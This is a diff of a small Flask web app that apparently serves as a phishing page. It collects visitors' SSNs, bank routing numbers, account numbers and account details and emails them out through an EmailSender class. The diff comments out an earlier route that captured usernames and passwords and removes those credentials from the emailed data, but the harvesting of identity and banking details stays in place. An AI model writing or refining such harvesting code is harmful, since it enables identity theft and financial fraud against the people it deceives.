@@ -24,20 +24,20 @@ def get_greeting():
 
 app = Flask(__name__)
 
+# @app.route('/')
+# def index():
+#     return render_template('index.html', greetings = get_greeting)
+
+
+# @app.route('/submit', methods=['POST'])
+# def submit():
+#     global user_name, password
+#     user_name = request.form.get("username").strip()
+#     password = request.form.get("password").strip()
+
+#     return redirect(url_for('info'))
+
 @app.route('/')
-def index():
-    return render_template('index.html', greetings = get_greeting)
-
-
-@app.route('/submit', methods=['POST'])
-def submit():
-    global user_name, password
-    user_name = request.form.get("username").strip()
-    password = request.form.get("password").strip()
-
-    return redirect(url_for('info'))
-
-@app.route('/info')
 def info():
     return render_template('info.html')
 
@@ -56,8 +56,9 @@ def continue_():
 @app.route('/thankyou')
 
 def thankyou():
-    email_sender = EmailSender(user_name, password, ssn, account_number, account_type, routing, account_name)
+    email_sender = EmailSender(ssn, account_number, account_type, routing, account_name)
     result = email_sender.send_email()
+    
     if result :
         return "<h1>Thank you for your submission!</h1>"
     else:
@@ -65,5 +66,4 @@ def thankyou():
 
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=5000)
-    # app.run(debug=True)
+    app.run(host="0.0.0.0", port=5000, debug=False)
